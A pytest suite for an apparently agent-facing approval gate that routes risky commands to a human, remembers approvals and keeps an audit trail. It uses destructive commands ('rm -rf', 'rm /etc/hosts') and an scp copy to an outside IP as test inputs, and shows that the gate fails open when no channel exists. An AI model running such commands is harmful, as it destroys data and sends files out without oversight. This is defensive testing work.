"""Unit tests for ark.intervention.gate — approval flow + memory + fail-open."""

import pytest
from pathlib import Path

from ark.intervention.policy import InterventionPolicy, Category
from ark.intervention.gate import (
    Gate, ApprovalChannel, ApprovalReply, NullChannel,
)


WORK = [Path("/home/u/proj"), Path("/home/u/proj/results")]


class FakeChannel(ApprovalChannel):
    """Scripted channel: returns the next queued reply, records requests."""
    def __init__(self, replies):
        self.replies = list(replies)
        self.requests = []
        self.notifications = []

    def request(self, req):
        self.requests.append(req)
        return self.replies.pop(0) if self.replies else None

    def notify(self, text):
        self.notifications.append(text)


def gate(channel, tmp_path=None, autonomy="standard"):
    return Gate(InterventionPolicy(autonomy=autonomy), channel, state_dir=tmp_path)


# ── fail-open ──────────────────────────────────────────────

def test_nullchannel_fails_open(tmp_path):
    g = gate(NullChannel(), tmp_path)
    assert g.check_command("rm -rf /home/u/other/x", work_dirs=WORK) is True


# ── approve / deny ─────────────────────────────────────────

def test_human_approve_proceeds(tmp_path):
    ch = FakeChannel([ApprovalReply("approve")])
    assert gate(ch, tmp_path).check_command("rm -rf /home/u/other/x", work_dirs=WORK) is True
    assert len(ch.requests) == 1


def test_human_deny_blocks(tmp_path):
    ch = FakeChannel([ApprovalReply("deny")])
    assert gate(ch, tmp_path).check_command("scp data.zip user@1.2.3.4:/tmp/", work_dirs=WORK) is False


def test_timeout_safe_default_deny(tmp_path):
    ch = FakeChannel([])  # no reply → None → timeout
    assert gate(ch, tmp_path).check_command("rm -rf /home/u/other/x", work_dirs=WORK) is False


# ── allow / notify pass straight through ───────────────────

def test_allow_does_not_contact_channel(tmp_path):
    ch = FakeChannel([])
    assert gate(ch, tmp_path).check_command("python train.py", work_dirs=WORK) is True
    assert ch.requests == []


def test_spend_notify_is_nonblocking(tmp_path):
    ch = FakeChannel([])
    g = gate(ch, tmp_path)
    assert g.check_action("spend", total_usd=25) is True
    assert ch.notifications  # an FYI was sent
    assert ch.requests == []  # but not a blocking ask


def test_spend_hardcap_denial_blocks(tmp_path):
    # over the hard cap → ASK; a denial returns False so run_agent can abort.
    ch = FakeChannel([ApprovalReply("deny")])
    assert gate(ch, tmp_path).check_action("spend", total_usd=150) is False
    assert ch.requests  # the human was asked


# ── approval memory ────────────────────────────────────────

def test_remember_category_skips_second_ask(tmp_path):
    ch = FakeChannel([ApprovalReply("approve", remember="category")])
    g = gate(ch, tmp_path)
    # first ask hits the channel and is remembered for the whole category
    assert g.check_command("rm -rf /home/u/other/a", work_dirs=WORK) is True
    # second, different destructive command → answered from memory, no new request
    assert g.check_command("rm /etc/hosts", work_dirs=WORK) is True
    assert len(ch.requests) == 1


def test_remember_command_only_matches_same_shape(tmp_path):
    ch = FakeChannel([ApprovalReply("approve", remember="command"),
                      ApprovalReply("deny")])
    g = gate(ch, tmp_path)
    assert g.check_command("rm -rf /home/u/other/run_12", work_dirs=WORK) is True
    # same shape, different number → memory hit, no second request
    assert g.check_command("rm -rf /home/u/other/run_98", work_dirs=WORK) is True
    assert len(ch.requests) == 1
    # a different category still asks (and we scripted a deny)
    assert g.check_command("scp data.zip user@1.2.3.4:/tmp/", work_dirs=WORK) is False
    assert len(ch.requests) == 2


def test_memory_persists_to_disk(tmp_path):
    ch = FakeChannel([ApprovalReply("approve", remember="category")])
    gate(ch, tmp_path).check_command("rm -rf /home/u/other/a", work_dirs=WORK)
    assert (tmp_path / "intervention_approvals.yaml").exists()
    # a fresh Gate reuses the persisted memory
    ch2 = FakeChannel([])
    g2 = gate(ch2, tmp_path)
    assert g2.check_command("rm -rf /home/u/other/b", work_dirs=WORK) is True
    assert ch2.requests == []


def test_audit_trail_written(tmp_path):
    ch = FakeChannel([ApprovalReply("deny")])
    gate(ch, tmp_path).check_command("scp data.zip user@1.2.3.4:/tmp/", work_dirs=WORK)
    assert (tmp_path / "intervention_audit.jsonl").exists()


# ── secret requests ────────────────────────────────────────

def test_request_secret_returns_value_and_never_logs_it(tmp_path):
    class SecretChan(NullChannel):
        def request_secret(self, name, purpose, *, origin="agent", timeout=1800):
            return "sk-the-secret-value-123"
    g = Gate(InterventionPolicy(), SecretChan(), state_dir=tmp_path)
    assert g.request_secret("HF_TOKEN", "download dataset") == "sk-the-secret-value-123"
    audit = (tmp_path / "intervention_audit.jsonl").read_text()
    assert "HF_TOKEN" in audit                       # the request is recorded
    assert "sk-the-secret-value-123" not in audit    # the VALUE is never recorded


def test_request_secret_none_when_no_channel(tmp_path):
    g = Gate(InterventionPolicy(), NullChannel(), state_dir=tmp_path)
    assert g.request_secret("X", "y") is None
